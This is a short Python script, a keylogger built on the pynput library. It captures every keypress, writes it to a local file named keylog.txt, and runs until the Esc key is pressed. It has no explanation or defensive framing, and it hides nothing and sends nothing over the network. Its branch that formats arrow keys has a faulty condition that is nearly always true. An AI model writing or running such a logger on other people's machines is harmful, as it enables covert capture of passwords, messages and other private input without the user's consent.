from pynput.keyboard import Key, Listener

count = 0
keys = []


def write_file(keys):
    with open("keylog.txt", 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)
            elif k == "Key.enter":
                f.write("\n")
            elif k.find("up") or k.find("down") or k.find("right") or k.find("left"):
                f.write("[" + k + "]")
            else:
                f.write(k)


def press(key):
    global keys, count

    keys.append(key)
    count += 1

    write_file(keys)
    keys.clear()


def release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()

